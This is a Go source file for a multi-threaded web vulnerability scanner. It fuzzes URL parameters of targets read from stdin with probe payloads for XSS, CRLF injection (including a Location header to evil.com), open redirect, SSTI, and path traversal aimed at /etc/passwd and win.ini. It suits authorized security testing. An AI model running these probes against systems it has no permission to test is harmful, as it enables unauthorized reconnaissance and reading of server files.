package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
)

type customheaders []string

func (h *customheaders) String() string { return "Custom headers" }
func (h *customheaders) Set(val string) error { *h = append(*h, val); return nil }

var (
	concurrency    int
	headers        customheaders
	proxy          string
	onlyPOC        bool
	userAgent      string
	timeoutSec     int
	paramCount     int
	mode           int
	vulnTypes      string
	payload        string
	requestsPerSec int
	maxIdleConns   int
	fuzzParams     string
)

const (
	clusterSize = 50
	maxBodySize = 2 << 20
)

const (
	VULN_XSS_REFLECTED  = 1
	VULN_XSS_SCRIPT     = 2
	VULN_CRLF           = 3
	VULN_REDIRECT       = 4
	VULN_LINK_MANIP     = 5
	VULN_SSTI           = 6
	VULN_PATH_TRAVERSAL = 7
)

var defaultFuzzParams = []string{
	"q", "search", "query", "s", "keyword", "keywords", "term", "terms",
	"filter", "filters", "where", "condition", "criteria",
	"page", "p", "offset", "limit", "per_page", "perpage", "size",
	"start", "end", "from", "to", "since", "until",
	"sort", "order", "sort_by", "order_by", "dir", "direction",
	"sort_order", "sort_dir",
	"id", "ids", "uid", "uuid", "guid", "code", "key", "token",
	"hash", "ref", "reference", "redirect", "return", "return_to",
	"next", "prev", "back", "callback", "call", "jsonp", "format",
	"output", "view", "template", "partial", "layout",
	"file", "filename", "path", "dir", "directory", "folder",
	"download", "upload", "image", "img", "photo", "picture",
	"user", "username", "login", "email", "mail", "name", "fullname",
	"firstname", "lastname", "nick", "nickname", "role", "group",
	"session", "sessid", "session_id", "auth", "api_key", "apikey",
	"api_token", "access_token",
	"action", "method", "op", "operation", "cmd", "command",
	"func", "function", "do", "run", "execute", "process",
	"data", "json", "xml", "body", "content", "text", "message",
	"comment", "feedback", "review", "rating", "score",
	"version", "v", "api", "endpoint", "resource", "service",
	"webhook", "notify", "alert",
	"lang", "language", "locale", "timezone", "tz", "zone",
	"theme", "skin", "mode", "debug", "test",
	"csrf", "csrf_token", "xsrf", "xsrf_token", "nonce",
	"signature", "sign", "hmac", "checksum", "fingerprint",
}

func init() {
	flag.IntVar(&concurrency, "t", 50, "Threads")
	flag.Var(&headers, "H", "Header extra")
	flag.StringVar(&proxy, "proxy", "", "Proxy HTTP")
	flag.StringVar(&proxy, "x", "", "Proxy HTTP")
	flag.BoolVar(&onlyPOC, "s", false, "Somente PoC (esconde Not Vulnerable)")
	flag.StringVar(&userAgent, "ua", "efx-scanner/3.0", "User-Agent")
	flag.IntVar(&timeoutSec, "timeout", 8, "Timeout")
	flag.IntVar(&paramCount, "params", 70, "Parâmetros por endpoint (0=todos)")
	flag.IntVar(&mode, "mode", 0, "Modo de extração")
	flag.StringVar(&vulnTypes, "vulns", "1,2,3,4,5,6,7", "Tipos de vulnerabilidade")
	flag.StringVar(&payload, "p", "FUZZ", "Payload")
	flag.IntVar(&requestsPerSec, "rps", 0, "Requests por segundo")
	flag.IntVar(&maxIdleConns, "max-idle", 100, "Conexões idle")
	flag.StringVar(&fuzzParams, "fuzz-params", "", "Parâmetros para fuzzing (ex: q,id,user)")
}

type RateLimiter struct {
	mu       sync.Mutex
	lastReq  time.Time
	interval time.Duration
}

func NewRateLimiter(rps int) *RateLimiter {
	if rps <= 0 {
		return nil
	}
	return &RateLimiter{
		interval: time.Second / time.Duration(rps),
	}
}

func (r *RateLimiter) Wait() {
	if r == nil {
		return
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	now := time.Now()
	if !r.lastReq.IsZero() {
		elapsed := now.Sub(r.lastReq)
		if elapsed < r.interval {
			time.Sleep(r.interval - elapsed)
		}
	}
	r.lastReq = time.Now()
}

var (
	clientPool    sync.Pool
	rateLimiter   *RateLimiter
	httpTransport *http.Transport
)

func initClientPool() {
	httpTransport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Duration(timeoutSec) * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        maxIdleConns,
		MaxIdleConnsPerHost: maxIdleConns / 10,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  false,
		DisableKeepAlives:   false,
	}

	if proxy != "" {
		if p, err := url.Parse(proxy); err == nil {
			httpTransport.Proxy = http.ProxyURL(p)
		}
	}

	clientPool = sync.Pool{
		New: func() interface{} {
			return &http.Client{
				Transport: httpTransport,
				Timeout:   time.Duration(timeoutSec) * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					if len(via) >= 10 {
						return http.ErrUseLastResponse
					}
					return nil
				},
			}
		},
	}
}

func getClient() *http.Client {
	return clientPool.Get().(*http.Client)
}

func putClient(client *http.Client) {
	clientPool.Put(client)
}

func applyHeaders(req *http.Request) {
	req.Header.Set("Connection", "close")
	if userAgent != "" {
		req.Header.Set("User-Agent", userAgent)
	}
	// Usando range com string corretamente
	for idx := 0; idx < len(headers); idx++ {
		headerLine := headers[idx]
		parts := strings.SplitN(headerLine, ":", 2)
		if len(parts) == 2 {
			headerName := strings.TrimSpace(parts[0])
			headerValue := strings.TrimSpace(parts[1])
			req.Header.Set(headerName, headerValue)
		}
	}
}

func fetchFullResponse(method, fullURL, body string) (headersResp string, bodyContent string, contentType string, err error) {
	rateLimiter.Wait()

	u, err := url.Parse(fullURL)
	if err != nil {
		return "", "", "", err
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	dialTimeout := time.Duration(timeoutSec) * time.Second

	readFull := func(c net.Conn, reqTarget string, tlsWrap bool) (string, string, string, error) {
		if tlsWrap {
			sn := u.Hostname()
			tconn := tls.Client(c, &tls.Config{ServerName: sn, InsecureSkipVerify: true})
			if err := tconn.Handshake(); err != nil {
				return "", "", "", err
			}
			c = tconn
		}
		if reqTarget == "" {
			reqTarget = u.RequestURI()
		}
		reqLine := method + " " + reqTarget + " HTTP/1.1\r\n"
		var reqBuilder strings.Builder
		reqBuilder.WriteString(reqLine)
		reqBuilder.WriteString("Host: " + u.Host + "\r\n")
		reqBuilder.WriteString("Connection: close\r\n")
		if userAgent != "" {
			reqBuilder.WriteString("User-Agent: " + userAgent + "\r\n")
		}
		for idx := 0; idx < len(headers); idx++ {
			h := headers[idx]
			parts := strings.SplitN(h, ":", 2)
			if len(parts) == 2 {
				reqBuilder.WriteString(strings.TrimSpace(parts[0]) + ": " + strings.TrimSpace(parts[1]) + "\r\n")
			}
		}
		if method == "POST" && body != "" {
			reqBuilder.WriteString("Content-Type: application/x-www-form-urlencoded\r\n")
			reqBuilder.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
		}
		reqBuilder.WriteString("\r\n")
		if method == "POST" && body != "" {
			reqBuilder.WriteString(body)
		}

		c.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))
		if _, err := c.Write([]byte(reqBuilder.String())); err != nil {
			return "", "", "", err
		}

		rd := bufio.NewReader(c)
		var headerBuilder strings.Builder
		contentType = ""

		for {
			line, err := rd.ReadString('\n')
			if err != nil {
				return "", "", "", err
			}
			headerBuilder.WriteString(line)

			if strings.HasPrefix(strings.ToLower(line), "content-type:") {
				contentType = strings.TrimSpace(strings.TrimPrefix(strings.ToLower(line), "content-type:"))
			}

			if line == "\r\n" || line == "\n" {
				break
			}
			if headerBuilder.Len() > 64*1024 {
				break
			}
		}

		bodyReader := io.LimitReader(rd, maxBodySize)
		bodyBytes, err := io.ReadAll(bodyReader)
		if err != nil {
			return headerBuilder.String(), "", contentType, err
		}

		return headerBuilder.String(), string(bodyBytes), contentType, nil
	}

	if proxy == "" {
		c, err := net.DialTimeout("tcp", host, dialTimeout)
		if err != nil {
			return "", "", "", err
		}
		defer c.Close()
		needTLS := (u.Scheme == "https")
		return readFull(c, "", needTLS)
	}

	pURL, err := url.Parse(proxy)
	if err != nil {
		return "", "", "", err
	}
	if pURL.Scheme != "http" {
		return "", "", "", fmt.Errorf("proxy scheme not supported")
	}
	proxyHost := pURL.Host
	if !strings.Contains(proxyHost, ":") {
		proxyHost += ":80"
	}
	c, err := net.DialTimeout("tcp", proxyHost, dialTimeout)
	if err != nil {
		return "", "", "", err
	}
	defer c.Close()

	if u.Scheme == "http" {
		return readFull(c, u.String(), false)
	}

	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", host, u.Host)
	c.SetDeadline(time.Now().Add(time.Duration(timeoutSec) * time.Second))
	if _, err := c.Write([]byte(connectReq)); err != nil {
		return "", "", "", err
	}
	br := bufio.NewReader(c)
	var respHead strings.Builder
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return "", "", "", err
		}
		respHead.WriteString(line)
		if strings.Contains(respHead.String(), "\r\n\r\n") {
			break
		}
		if respHead.Len() > 32*1024 {
			break
		}
	}
	if !strings.Contains(strings.ToLower(respHead.String()), " 200 ") {
		return "", "", "", fmt.Errorf("proxy CONNECT failed")
	}
	return readFull(c, "", true)
}

func isHTMLResponse(contentType string) bool {
	contentType = strings.ToLower(contentType)
	return strings.Contains(contentType, "text/html") ||
		strings.Contains(contentType, "application/xhtml+xml")
}

func fetchBody(rawURL string) (string, error) {
	client := getClient()
	defer putClient(client)

	rateLimiter.Wait()

	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return "", err
	}
	applyHeaders(req)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
	return string(body), err
}

var (
	reJSONKeys  = regexp.MustCompile(`['"]?([a-zA-Z0-9_-]+)['"]?\s*:`)
	reInputName = regexp.MustCompile(`name="([a-zA-Z0-9_-]+)"`)
	reID        = regexp.MustCompile(`id="([a-zA-Z0-9_-]+)"`)
	reQueryKeys = regexp.MustCompile(`[?&]([a-zA-Z0-9_-]+)=`)
	reAssign    = regexp.MustCompile(`\b([a-zA-Z0-9_-]+)\s*=`)
)

func extractParamNamesFromBody(body string, modo int) []string {
	var regexes []*regexp.Regexp
	switch modo {
	case 0:
		regexes = []*regexp.Regexp{reJSONKeys, reInputName, reID, reQueryKeys, reAssign}
	case 1:
		regexes = []*regexp.Regexp{reJSONKeys}
	case 2:
		regexes = []*regexp.Regexp{reInputName}
	case 3:
		regexes = []*regexp.Regexp{reID}
	case 4:
		regexes = []*regexp.Regexp{reQueryKeys}
	case 5:
		regexes = []*regexp.Regexp{reAssign}
	default:
		return nil
	}

	unique := make(map[string]struct{}, 100)
	for _, rx := range regexes {
		matches := rx.FindAllStringSubmatch(body, -1)
		for _, m := range matches {
			if len(m) > 1 && len(m[1]) > 1 {
				unique[m[1]] = struct{}{}
			}
		}
	}

	keys := make([]string, 0, len(unique))
	for k := range unique {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

func queryKeysFromURL(u *url.URL) []string {
	query := u.Query()
	if len(query) == 0 {
		return nil
	}

	keys := make([]string, 0, len(query))
	for k := range query {
		if k != "" {
			keys = append(keys, k)
		}
	}
	sort.Strings(keys)
	return keys
}

func getFuzzParamsList() []string {
	if fuzzParams != "" {
		return strings.Split(fuzzParams, ",")
	}
	return defaultFuzzParams
}

func montarURLRaw(base string, params []string, rawPayload string) string {
	u, err := url.Parse(base)
	if err != nil {
		return ""
	}

	queryParts := make([]string, 0, len(params)+1)
	if u.RawQuery != "" {
		queryParts = append(queryParts, u.RawQuery)
	}

	for _, k := range params {
		queryParts = append(queryParts, fmt.Sprintf("%s=%s", url.QueryEscape(k), rawPayload))
	}

	if len(queryParts) > 0 {
		u.RawQuery = strings.Join(queryParts, "&")
	}

	return u.String()
}

func chunkSlice(slice []string, size int) [][]string {
	if len(slice) == 0 {
		return nil
	}

	chunks := make([][]string, 0, (len(slice)+size-1)/size)
	for i := 0; i < len(slice); i += size {
		end := i + size
		if end > len(slice) {
			end = len(slice)
		}
		chunks = append(chunks, slice[i:end])
	}
	return chunks
}

func getRandomParams(params []string, count int) []string {
	if count <= 0 || len(params) == 0 {
		return params
	}
	if count >= len(params) {
		return params
	}

	temp := make([]string, len(params))
	copy(temp, params)

	rand.Shuffle(len(temp), func(i, j int) { temp[i], temp[j] = temp[j], temp[i] })

	return temp[:count]
}

func formatVuln(kind, method, urlStr, detail string) string {
	if onlyPOC {
		return fmt.Sprintf("[VULN] %s | %s", urlStr, kind)
	}
	return fmt.Sprintf("Vulnerable [%s] - %s %s | %s", kind, method, urlStr, detail)
}

func formatNotVuln(kind, method, urlStr string) string {
	if onlyPOC {
		return ""
	}
	return fmt.Sprintf("Not Vulnerable [%s] - %s %s", kind, method, urlStr)
}

func testXSSReflected(baseURL string, params []string) []string {
	var results []string
	rawPayload := `'"teste`
	encodedPayload := url.QueryEscape(rawPayload)

	for _, cluster := range chunkSlice(params, clusterSize) {
		testURL := montarURLRaw(baseURL, cluster, encodedPayload)
		if testURL == "" {
			continue
		}

		_, body, contentType, err := fetchFullResponse("GET", testURL, "")
		if err != nil {
			continue
		}

		if !isHTMLResponse(contentType) {
			continue
		}

		if strings.Contains(body, rawPayload) {
			results = append(results, formatVuln("XSS-Reflected", "GET", testURL, fmt.Sprintf("match: %s (Content-Type: %s)", rawPayload, contentType)))
			return results
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, encodedPayload)
		results = append(results, formatNotVuln("XSS-Reflected", "GET", exampleURL))
	}

	return results
}

func testXSSScript(baseURL string, params []string) []string {
	var results []string
	rawPayload := `</script><teste>`
	encodedPayload := url.QueryEscape(rawPayload)

	for _, cluster := range chunkSlice(params, clusterSize) {
		testURL := montarURLRaw(baseURL, cluster, encodedPayload)
		if testURL == "" {
			continue
		}

		_, body, contentType, err := fetchFullResponse("GET", testURL, "")
		if err != nil {
			continue
		}

		if !isHTMLResponse(contentType) {
			continue
		}

		if strings.Contains(body, rawPayload) {
			results = append(results, formatVuln("XSS-Script", "GET", testURL, fmt.Sprintf("match: %s (Content-Type: %s)", rawPayload, contentType)))
			return results
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, encodedPayload)
		results = append(results, formatNotVuln("XSS-Script", "GET", exampleURL))
	}

	return results
}

func testCRLF(baseURL string, params []string) []string {
	var results []string
	crlfPayloads := []string{
		"\r\nInjected-Header: efx\r\n\r\n",
		"\r\nSet-Cookie: injected=efx\r\n",
		"%0d%0aSet-Cookie:%20injected=efx%0d%0a",
		"\r\nX-Injected: efx\r\n",
		"\r\nLocation: https://evil.com\r\n",
	}

	for _, rawPayload := range crlfPayloads {
		encodedPayload := url.QueryEscape(rawPayload)

		for _, cluster := range chunkSlice(params, clusterSize) {
			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
			if testURL == "" {
				continue
			}

			headersResp, _, _, err := fetchFullResponse("GET", testURL, "")
			if err != nil {
				continue
			}

			headersLower := strings.ToLower(headersResp)

			if strings.Contains(headersLower, "injected-header: efx") ||
				strings.Contains(headersLower, "set-cookie: injected=efx") ||
				strings.Contains(headersLower, "x-injected: efx") ||
				strings.Contains(headersLower, "location: https://evil.com") ||
				strings.Contains(headersLower, "set-cookie: efx") {
				results = append(results, formatVuln("CRLF-Injection", "GET", testURL,
					fmt.Sprintf("header injection detected with payload: %q", rawPayload)))
				return results
			}
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(crlfPayloads[0]))
		results = append(results, formatNotVuln("CRLF-Injection", "GET", exampleURL))
	}

	return results
}

func testRedirect(baseURL string, params []string) []string {
	var results []string
	rawPayload := `https://example.com`
	encodedPayload := url.QueryEscape(rawPayload)

	for _, cluster := range chunkSlice(params, clusterSize) {
		testURL := montarURLRaw(baseURL, cluster, encodedPayload)
		if testURL == "" {
			continue
		}

		body, err := fetchBody(testURL)
		if err != nil {
			continue
		}

		if strings.Contains(body, "Example Domain") {
			results = append(results, formatVuln("Redirect/SSRF", "GET", testURL, "match: Example Domain"))
			return results
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, encodedPayload)
		results = append(results, formatNotVuln("Redirect/SSRF", "GET", exampleURL))
	}

	return results
}

func testLinkManip(baseURL string, params []string) []string {
	var results []string

	payloads := []string{
		"https://efxtech.com",
		"//efxtech.com",
		"efxtech.com",
	}

	for _, currentPayload := range payloads {
		encodedPayload := url.QueryEscape(currentPayload)

		for _, cluster := range chunkSlice(params, clusterSize) {
			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
			if testURL == "" {
				continue
			}

			body, err := fetchBody(testURL)
			if err != nil {
				continue
			}

			if detectLinkInjection(body, currentPayload) {
				results = append(results, formatVuln("Link-Manipulation", "GET", testURL,
					fmt.Sprintf("injection detected with payload: %s", currentPayload)))
				return results
			}
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(payloads[0]))
		results = append(results, formatNotVuln("Link-Manipulation", "GET", exampleURL))
	}

	return results
}

func detectLinkInjection(body, payload string) bool {
	bodyLower := strings.ToLower(body)
	payloadLower := strings.ToLower(payload)

	patterns := []string{
		fmt.Sprintf(`src="%s`, payload),
		fmt.Sprintf(`href="%s`, payload),
		fmt.Sprintf(`action="%s`, payload),
		fmt.Sprintf(`src='%s`, payload),
		fmt.Sprintf(`href='%s`, payload),
		fmt.Sprintf(`action='%s`, payload),
		fmt.Sprintf(`src=%s`, payload),
		fmt.Sprintf(`href=%s`, payload),
		fmt.Sprintf(`action=%s`, payload),
		fmt.Sprintf(`src = "%s`, payload),
		fmt.Sprintf(`href = "%s`, payload),
		fmt.Sprintf(`action = "%s`, payload),
		fmt.Sprintf(`srcdoc="%s`, payload),
		fmt.Sprintf(`srcdoc='%s`, payload),
		fmt.Sprintf(`.href = "%s`, payload),
		fmt.Sprintf(`.src = "%s`, payload),
		fmt.Sprintf(`location = "%s`, payload),
		fmt.Sprintf(`location.href = "%s`, payload),
		fmt.Sprintf(`("%s")`, payload),
		fmt.Sprintf(`('%s')`, payload),
		fmt.Sprintf(`("%s",`, payload),
		fmt.Sprintf(`('%s',`, payload),
		fmt.Sprintf(`.html = "%s`, payload),
		fmt.Sprintf(`.html = '%s`, payload),
	}

	for _, pattern := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true
		}
	}

	additionalPatterns := []string{
		fmt.Sprintf("('href', '%s", payloadLower),
		fmt.Sprintf("('href', \"%s", payloadLower),
		fmt.Sprintf(".href = '%s", payloadLower),
		fmt.Sprintf(".href = \"%s", payloadLower),
		fmt.Sprintf("location = '%s", payloadLower),
		fmt.Sprintf("location = \"%s", payloadLower),
	}

	for _, pattern := range additionalPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	return false
}

func testSSTI(baseURL string, params []string) []string {
	var results []string
	payloads := []string{`{{7*7}}efxtech`, `${{7*7}}efxtech`, `*{7*7}efxtech`}

	for _, rawPayload := range payloads {
		encodedPayload := url.QueryEscape(rawPayload)
		for _, cluster := range chunkSlice(params, clusterSize) {
			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
			if testURL == "" {
				continue
			}

			body, err := fetchBody(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(body, "49efxtech") {
				results = append(results, formatVuln("SSTI", "GET", testURL, "match: 49efxtech"))
				return results
			}
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(payloads[0]))
		results = append(results, formatNotVuln("SSTI", "GET", exampleURL))
	}

	return results
}

func testPathTraversal(baseURL string, params []string) []string {
	var results []string

	traversalPayloads := []string{
		"../../../../etc/passwd",
		"....//....//....//etc/passwd",
		"..;/..;/..;/etc/passwd",
		"..\\..\\..\\windows\\win.ini",
	}

	for _, rawPayload := range traversalPayloads {
		encodedPayload := url.QueryEscape(rawPayload)

		for _, cluster := range chunkSlice(params, clusterSize) {
			testURL := montarURLRaw(baseURL, cluster, encodedPayload)
			if testURL == "" {
				continue
			}

			body, err := fetchBody(testURL)
			if err != nil {
				continue
			}

			if detectPathTraversalSuccess(body, rawPayload) {
				results = append(results, formatVuln("Path-Traversal", "GET", testURL,
					fmt.Sprintf("file read successful with payload: %q", rawPayload)))
				return results
			}
		}
	}

	if len(results) == 0 && !onlyPOC {
		exampleParams := params
		if len(exampleParams) > 10 {
			exampleParams = exampleParams[:10]
		}
		exampleURL := montarURLRaw(baseURL, exampleParams, url.QueryEscape(traversalPayloads[0]))
		results = append(results, formatNotVuln("Path-Traversal", "GET", exampleURL))
	}

	return results
}

func detectPathTraversalSuccess(body, payload string) bool {
	isTraversalPayload := strings.Contains(payload, "../") ||
		strings.Contains(payload, "..\\") ||
		strings.Contains(payload, "..;/")

	if !isTraversalPayload {
		return false
	}

	bodyLower := strings.ToLower(body)

	if strings.Contains(bodyLower, "root:x:0:0") {
		return true
	}

	if strings.Contains(bodyLower, "for 16-bit app support") {
		return true
	}

	return false
}

func parseVulnTypes() map[int]bool {
	selected := make(map[int]bool)
	if vulnTypes == "" {
		for i := 1; i <= 7; i++ {
			selected[i] = true
		}
		return selected
	}

	parts := strings.Split(vulnTypes, ",")
	for _, part := range parts {
		var num int
		fmt.Sscanf(strings.TrimSpace(part), "%d", &num)
		if num >= 1 && num <= 7 {
			selected[num] = true
		}
	}
	return selected
}

func processURL(rawURL string, selectedVulns map[int]bool) {
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		rawURL = "http://" + rawURL
	}

	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return
	}

	body, _ := fetchBody(rawURL)

	pSet := make(map[string]struct{})

	if body != "" {
		for _, k := range extractParamNamesFromBody(body, mode) {
			if k != "" {
				pSet[k] = struct{}{}
			}
		}
	}

	for _, k := range queryKeysFromURL(u) {
		if k != "" {
			pSet[k] = struct{}{}
		}
	}

	for _, k := range getFuzzParamsList() {
		pSet[k] = struct{}{}
	}

	if len(pSet) == 0 {
		return
	}

	params := make([]string, 0, len(pSet))
	for k := range pSet {
		params = append(params, k)
	}
	sort.Strings(params)

	selectedParams := getRandomParams(params, paramCount)

	if selectedVulns[VULN_XSS_REFLECTED] {
		for _, res := range testXSSReflected(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}

	if selectedVulns[VULN_XSS_SCRIPT] {
		for _, res := range testXSSScript(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}

	if selectedVulns[VULN_CRLF] {
		for _, res := range testCRLF(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}

	if selectedVulns[VULN_REDIRECT] {
		for _, res := range testRedirect(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}

	if selectedVulns[VULN_LINK_MANIP] {
		for _, res := range testLinkManip(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}

	if selectedVulns[VULN_SSTI] {
		for _, res := range testSSTI(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}

	if selectedVulns[VULN_PATH_TRAVERSAL] {
		for _, res := range testPathTraversal(rawURL, selectedParams) {
			fmt.Println(res)
		}
	}
}

func main() {
	flag.Parse()

	if concurrency < 1 {
		concurrency = 1
	}
	if concurrency > 500 {
		concurrency = 500
	}
	if maxIdleConns < concurrency {
		maxIdleConns = concurrency * 2
	}

	if requestsPerSec > 0 {
		rateLimiter = NewRateLimiter(requestsPerSec)
	}

	initClientPool()
	rand.Seed(time.Now().UnixNano())

	selectedVulns := parseVulnTypes()

	scanner := bufio.NewScanner(os.Stdin)
	var urls []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			urls = append(urls, line)
		}
	}

	if len(urls) == 0 {
		fmt.Fprintf(os.Stderr, "Usage: echo 'http://target.com' | go run scanner.go -vulns 1,2,3,4,5,6,7\n")
		os.Exit(1)
	}

	jobs := make(chan string, len(urls))
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for url := range jobs {
				processURL(url, selectedVulns)
			}
		}()
	}

	for _, url := range urls {
		jobs <- url
	}
	close(jobs)

	wg.Wait()
}
